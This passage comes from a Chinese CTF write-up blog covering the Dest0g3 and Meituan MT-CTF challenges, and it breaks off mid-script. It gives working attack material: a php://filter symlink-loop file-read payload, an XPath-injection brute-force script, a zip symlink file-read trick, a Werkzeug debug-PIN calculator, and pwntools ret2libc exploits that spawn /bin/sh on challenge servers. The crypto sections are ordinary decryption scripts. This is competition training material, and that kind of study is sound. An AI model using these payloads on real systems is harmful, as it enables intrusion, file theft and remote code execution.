<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/15c694e4a91444b9bc0cce7ce6334798.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>没有回显，对php代码审计，发现 require_once函数，发现干货了</p>
</blockquote>
<blockquote>
<p>require_once() 语句在脚本执行期间包括并运行指定文件。此<a href="http://www.php.cn/php/php-tp-behavior.html">行为</a>和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>PHP最新版的小Trick,require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/[pid]`记录了系统运行的信息状态，而`/proc/self`指的是当前进程(自身进程)的pid，就类似于类里面的`this</span><br></pre></td></tr></table></figure>
<p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接</p>
</blockquote>
<blockquote>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3af4fa34b35446609646329ab107b20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得flag.php的源码，base64解码获得flag：</p>
<p>Dest0g3{f05260c1-70e9-481b-89b1-eb397377f621}</p>
</blockquote>
<h3 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h3>
<p>**题目描述：**Post something</p>
<p><strong>附件下载：</strong><a href="http://d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81/">d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获取界面：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/e36c7a302fd44ad392077cd7e4e91506.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、没啥干的，直接代码审计</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮显示，没啥用</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;<span class="comment">//读取fl4g.php文件</span></span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//对dest0g3传入参数‘ctf’</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);<span class="comment">//对时间的限制，下同</span></span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;<span class="comment">//如果时间为假，则输出fl4g，反之输出&quot;Try harder!&quot;,很显然时间不可能为假。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(//看到这个函数，就有解了后有详解，既对传入参数进行比对，只要让他运行错误就行。</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>干货：set_error_handler () 函数<strong>设置用户自定义的错误处理函数</strong>。. 该函数用于创建运行时期间的用户自己的错误处理方法。. 该函数会返回旧的错误处理程序，若失败，则返回 null。</p>
</blockquote>
<blockquote>
<p>3、构建数组报错POST：ctf[]=1</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dff3286ffba6434fac7bb6c3a38f6ec5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{a57b8d1d-da8f-42ee-a782-3a92bc372ec3}</p>
</blockquote>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py">https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，fofa分解n，常规解。上脚本，获取flag。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line">p = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line"><span class="built_in">print</span>(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py">https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，AES常规解。上脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">flag = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<h3 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py">https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开附件，尝试用Pohlig-Hellman 算法的方法，进行解密，但是想不通，就去搜了一下对pow（）逆运算，发现sage有相应的函数，写解密脚本，放到sagemath（<a href="https://sagecell.sagemath.org/">Sage Cell Server (sagemath.org)</a>）中运行。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">d=discrete_log(h,mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接着在本地环境运行以下代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="number">627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>MT-CTF-Writeup</title>
    <url>/2022/09/MT-CTF-Writeup/</url>
    <content><![CDATA[<p>美团CTF，好玩的，难度也不错，师傅们太强啦！</p>
<span id="more"></span>
<h1 id="mininep1战队-mt-ctf-writeup"><a class="markdownIt-Anchor" href="#mininep1战队-mt-ctf-writeup"></a> <strong>MiniNep1战队-MT-CTF-Writeup</strong></h1>
<h2 id="战队信息"><a class="markdownIt-Anchor" href="#战队信息"></a> <strong>战队信息：</strong></h2>
<h3 id="战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"><a class="markdownIt-Anchor" href="#战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"></a> 战队成员：TWe1v3、zealot、1amfree、scr1pt_k1ddi3、ZERO</h3>
<h3 id="战队名称mininep1"><a class="markdownIt-Anchor" href="#战队名称mininep1"></a> <strong>战队名称：MiniNep1</strong></h3>
<h3 id="战队排名"><a class="markdownIt-Anchor" href="#战队排名"></a> <strong>战队排名：</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png" alt="x"></p>
<h2 id="解题情况"><a class="markdownIt-Anchor" href="#解题情况"></a> <strong>解题情况：</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/ezFtSI_DXc66SQ4rsGdDiw.png" alt="2"></p>
<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h3>
<h4 id="strange_rsa1"><a class="markdownIt-Anchor" href="#strange_rsa1"></a> <strong>strange_rsa1</strong></h4>
<p>在给定的实数域上求根，然后转整数得到q，解RSA即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413</span><br><span class="line">c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924</span><br><span class="line">gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938</span><br><span class="line"></span><br><span class="line">F=RealField(prec=512*2)</span><br><span class="line">R.&lt;x&gt;=PolynomialRing(F)</span><br><span class="line">f=x*x*gift-n</span><br><span class="line">r=f.roots()[0][0]</span><br><span class="line">q=int(abs(r))</span><br><span class="line">#q=10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369</span><br><span class="line">p=n//q</span><br><span class="line">d=inverse(e,(p-1)*(q-1))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">#b&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="strange_rsa2"><a class="markdownIt-Anchor" href="#strange_rsa2"></a> <strong>strange_rsa2</strong></h4>
<p>注意这题用到了上题的flag。</p>
<p>给出了两个随机多项式，我的想法是构造二元多项式，用grobner基求出a。由于模数p未知，先用n替代。然而解完惊奇地发现顺带把p直接规约出来了，属于是意外收获了。后面解RSA就OK了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def my_poly(coe,x):</span><br><span class="line">	res=0</span><br><span class="line">	for i in range(1,513):</span><br><span class="line">		res+=coe[i-1]*(x^i)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">flag1 = b&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span><br><span class="line">k = bytes_to_long(flag1)</span><br><span class="line">exec(open(&#x27;output.txt&#x27;,&#x27;r&#x27;).read())</span><br><span class="line">R.&lt;a,t&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">s1=gift[0][0]</span><br><span class="line">coe1=gift[0][1:]</span><br><span class="line">s2=gift[1][0]</span><br><span class="line">coe2=gift[1][1:]</span><br><span class="line">f1=my_poly(coe1,a)+s1</span><br><span class="line">f2=my_poly(coe2,t)+s2</span><br><span class="line"></span><br><span class="line">res=Ideal([f1,f2,t-k*a]).groebner_basis()</span><br><span class="line">print(res)</span><br><span class="line">res=[ x.constant_coefficient() for x in res]</span><br><span class="line">a,t,p=list(map(int,res))</span><br><span class="line">print(a,t,p)</span><br><span class="line">q=n//p</span><br><span class="line">d=inverse(e,(p-1)*(q-1))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(long_to_bytes(int(m)))</span><br><span class="line">#b&#x27;flag&#123;e6d7511d75bd537e1bd0cd08abea415f5f27d6cf&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="web"><a class="markdownIt-Anchor" href="#web"></a> <strong>Web</strong></h3>
<h4 id="babyjava"><a class="markdownIt-Anchor" href="#babyjava"></a> <strong>babyjava</strong></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze39yqy7j0c006fv94i.cloudeci1.ichunqiu.com:8888/hello&quot;</span></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-@!&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1=<span class="string">&quot;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload2=<span class="string">&quot;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload3=<span class="string">&quot;&#x27;or substring(name(/root/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span> <span class="comment">#username username</span></span><br><span class="line"><span class="comment">#&#x27;or string-length(name(/root/user/username[2]))=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line">payload4=<span class="string">&quot;&#x27;or substring(/root/user/username[2]/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data=&#123;<span class="string">&quot;xpath&quot;</span>:payload4.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;This information is not available&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&quot;!&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># if &quot;This information is not available&quot; in r.text:</span></span><br><span class="line">        <span class="comment">#     print(flag)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
<p>xpath注入，flag在user的第二个username里</p>
<p><img src="/2022/09/MT-CTF-Writeup/Yhut2UBDdjhU1HRdsrIkJQ.png" alt="3"></p>
<h4 id="onlineuzip"><a class="markdownIt-Anchor" href="#onlineuzip"></a> <strong>OnlineUzip</strong></h4>
<p>文件上传存在软链接任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s / test</span><br><span class="line">zip -y test.zip test</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/MT-CTF-Writeup/MqA7vFiNYqVxVBxCUaSVOg.png" alt="4"></p>
<p>flag文件没有权限，但是报错了，尝试去还原pin</p>
<p><img src="/2022/09/MT-CTF-Writeup/vK2D2uEAIPF8eUlvvjO1Ww.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;ctf&#x27;</span><br><span class="line">    &#x27;flask.app&#x27;,</span><br><span class="line">    &#x27;Flask&#x27;,</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;95530260679&#x27;,</span><br><span class="line">    &#x27;96cec10d3d9307792745ec3b85c8962029821f34fdecf5402e3da60b23c2cfc8a0b98c91124624fa89bfc7f4950ef9f5&#x27;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>然后进入直接执行python命令读取flag</p>
<p><img src="/2022/09/MT-CTF-Writeup/NIj_m3ePomvNmqnedYKJqw.png" alt="6"></p>
<h3 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> <strong>PWN</strong></h3>
<h4 id="note"><a class="markdownIt-Anchor" href="#note"></a> <strong>note</strong></h4>
<p>edit存在越界编辑，可以直接ret2libc。</p>
<p><img src="/2022/09/MT-CTF-Writeup/9GVF4sWsMZTpZTzVsU4WCA.png" alt="7"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line">r=remote(&quot;39.106.78.22&quot;,35482)</span><br><span class="line">elf=ELF(&quot;/home/ubuntu/pwn/比赛/MTCTF/note/note&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(&quot;5. leave&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    meau(1)</span><br><span class="line">    r.sendlineafter(&quot;Size: &quot;,str(size))</span><br><span class="line">    r.sendafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    meau(2)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    meau(3)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(index))</span><br><span class="line">    r.sendafter(&quot;Content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    meau(4)</span><br><span class="line">    r.sendlineafter(&quot;Index: &quot;,str(index))</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = 0x401150</span><br><span class="line">pop_rdi_ret = 0x00000000004017b3</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line">add(0x100,&#x27;a&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27;*8 + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">edit(-4,payload)</span><br><span class="line">libc_base=u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)) - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh = libc_base+libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">payload = b&#x27;a&#x27;*8 + p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+p64(system_addr)+p64(start_addr)</span><br><span class="line">edit(-4,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc_aarch64"><a class="markdownIt-Anchor" href="#ret2libc_aarch64"></a> <strong>ret2libc_aarch64</strong></h4>
<p>异构pwn，可以直接泄露出libc数据，然后直接根据aarch64的调用规则，调用system(“/bin/sh”)。</p>
<p><img src="/2022/09/MT-CTF-Writeup/K5J0v8JuNuVU0KNm3B0IGA.png" alt="8"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;aarch64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span><br><span class="line"></span><br><span class="line">local = 2</span><br><span class="line">if local == 0:</span><br><span class="line">    r=process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;,&#x27;./pwn&#x27;])</span><br><span class="line">if local == 1:</span><br><span class="line">    r=process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/home/ubuntu/pwn/arm_pwn/pwn&#x27;,&#x27;./pwn&#x27;])</span><br><span class="line">else:</span><br><span class="line">    r=remote(&quot;39.106.78.22&quot;,16078)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = ELF(&quot;/home/ubuntu/pwn/arm_pwn/pwn/lib/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def meau(index):</span><br><span class="line">    r.sendlineafter(&quot;&gt;&quot;,str(index))</span><br><span class="line"></span><br><span class="line">meau(1)</span><br><span class="line">setbuf_got=elf.got[&#x27;setbuf&#x27;]</span><br><span class="line">r.send(p64(setbuf_got))</span><br><span 